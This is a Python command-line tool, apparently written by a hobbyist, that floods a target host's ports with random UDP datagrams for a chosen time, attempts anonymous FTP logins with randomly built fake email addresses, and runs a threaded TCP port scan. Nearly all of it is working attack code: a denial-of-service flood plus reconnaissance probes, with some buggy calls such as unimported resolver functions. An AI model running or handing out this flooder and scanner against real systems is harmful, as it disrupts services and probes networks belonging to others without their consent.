import socket
import argparse
import threading
import multiprocessing
import ftplib
import random
import time
import queue
import sys
import os

from multiprocessing import process

mailfront = ["Zofia", "Test", "Jack", "Alehandro", "Vladimir", "Boston", "Loquisha", "Mahogany", "Ferrari", "Michigan", "August", "Ireland", "Government", "Alerter"]
mailback = ["gmail.com", "yahoo.com", "hotmail.com", "gov.edu", "aol.com"]

global flood_time
global target_host 
global target_Ports
global args_tmp
args_tmp = []
target_host = ""
target_Ports = ['80']
flood_time = 0
threads = []
#target_Ports.append(0)

parser = argparse.ArgumentParser(usage = '\n--Host (-H) [TARGET-HOST]\n--Ports for Scanning (-p) [TARGET-PORTS (ex. 21 125 80)]\n--Anonymous FTP Login Query (-a) (No Args)\n--UDP Flooding Enabled (-u 200) where 200 is time to spam\n')
parser.add_argument("-H", "--Host", help = 'Give Target Host!', required = True)
parser.add_argument("-p", "--ports", nargs = '+', help = 'Give Target Port!')
parser.add_argument("-a", "--Anon", action = 'store_true', help = 'Sets Anonymous FTP Query Mode')
parser.add_argument("-u", "--flood", nargs = 1, help = 'Flood Host with random UDP Datagrams')
args = parser.parse_args()
target_host = args.Host
if (type(args.ports) == int) or (type(args.ports) == list):
    target_Ports = args.ports
else:
    print("Ports value malformed")
    print(parser.usage)
flood_time = args.flood
print(args) #Test
if ((target_Ports[0]) == 0) and ((args.Anon) == False) and ((flood_time) == 0): #Must use at least one of these
    print("Missing Parameters!  Must use -u with some ports")
    print(parser.usage)
    exit(0)
elif ((target_Ports[0]) == 0) and ((flood_time) == 0):
    print("Must Select Ports for UDP Flooding with -p!")
    print(parser.usage)
    exit(0)

def flood_host(host, portlist, flood_time):
    global args_tmp
    print("Flood_host Test") #Test
    count = 0
    portrange = len(portlist)
    portlisttmp = []
    proclist = []
    for port in range(portrange):
        portlisttmp.append(portlist[port])
    for port in portlisttmp:
        count = count + 1
        #new = count
        #p = str(new)
        args_tmp = []
        args_tmp.append(host)
        args_tmp.append(port)
        args_tmp.append(flood_time)
        print("Creating Class port_flooder for port "+str(port))
        port_Flooder(args_tmp)
        #p = multiprocessing.process.BaseProcess(target = flood_port(host, port, flood_time))
        #p.daemon = True
        #proclist.append(p)
        #p.start()
        #p.close()
    #for process in proclist:
    #    process.process.join()

    #for port in range(portrange):
        #count = count + 1
        #print(portlist[port])
        #t = threading.Thread(target = flood_port(host, portlist[port], flood_time)).setDaemon(True)
        #t.setDaemon(True)
        #t.start()
    #for t in threads:
        #t.join()

class port_Flooder(multiprocessing.process.BaseProcess):

    def __init__(self, args_tmp):
        super().__init__(name = 'Test')
        print("Class Instantiated")
        tmphost = (args_tmp[0]) #Host (Constant)
        tmpport = (args_tmp[1]) #Port (Dynamic)
        tmpflood_time = (args_tmp[2]) #Flood Time (Constant)
        self.run(tmphost, tmpport, tmpflood_time)

    def run(self, host, port, f_time):
        print("run")
        flood_port(host, port, f_time)

def flood_port(*args):
    tmphost = args[0]
    tmpport = args[1]
    tmpflood_time = args[2]
    print("Flooding Port "+str(tmpport)+" Using PID "+str(os.getpid()))
    current_count = 0
    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    random_data = bytes(random._urandom(512))
    stop_time = int(time.time()) + int(tmpflood_time[0])
    msg = 0
    while True:
        if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
            break
        else:
            pass
        print("Datagram "+str(msg)+" Sent to "+tmphost+" on Port "+str(tmpport))
        msg = msg + 1
        temp_socket.sendto(random_data, (tmphost, int(tmpport)))
        current_count = current_count + 1

def query_Login(host):
    try:
        tmpftp = ftplib.FTP(host)
        tmpmail = random.choice(mailfront)+"@"+random.choice(mailback)
        print(tmpmail)
        tmpftp.login('anonymous', tmpmail)
        print(str(host)+" Succeeded Connecting via FTP")
        crawl(tmpftp)
        tmpftp.quit()
    except:
        print(str(host)+" Failed Connecting Via FTP")


def crawl(connection):
    backlist = []
    list = []
    try:
        list = connection.dir()
    except:
        print("Failed Retrieiving Default Directory Contents")
        pass
    #for file in list:
    #    name = file.lower()
    #    if ('.php' or '.html' or '.htm' or '.asp') in name:
    #       print("Appending "+name)
    #       backlist.append(name)
    return backlist


def Connect(target_host, target_port):
    try:
        current_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        current_socket.connect((target_host, target_port))
        print("Socket Connected to "+target_host+" on Port "+str(target_port))
        current_socket.send(b'Hello\r\n') #Payload
        feedback = current_socket.recv(100)
        print(str(feedback))
        current_socket.close()
    except socket.error:
        print("Error Connecting on Port "+str(target_port))

def Port_Scan(target_host, target_Ports):
    threads = []
    try:
        target_IP = gethostbyname(target_host)
    except:
        print("Error Resolving FQDN to IP!")
    try:
        target_Name = gethostbyaddr(target_IP)
        print(target_Name)
    except:
        print("Error Resolving Host name from IP!")
    lenport = len(target_Ports)
    x = 0
    for x in range(lenport):
        curport = target_Ports[x]
        print(curport)
        x = x + 1
        print("Scanning Port "+str(curport))
        tconnect = threading.Thread(target = Connect(target_host, int(curport)))
        tconnect.start()

def main():
    print("")
    if (args.flood != None):
        flood_host(target_host, target_Ports, flood_time)
    else:
        pass
    if (args.Anon == True):
        query_Login(target_host)
    else:
        pass
    if (((target_Ports) != 0) and (args.flood == None)):
        Port_Scan(target_host, target_Ports)
    else:
        pass
    print("All Done")
main()
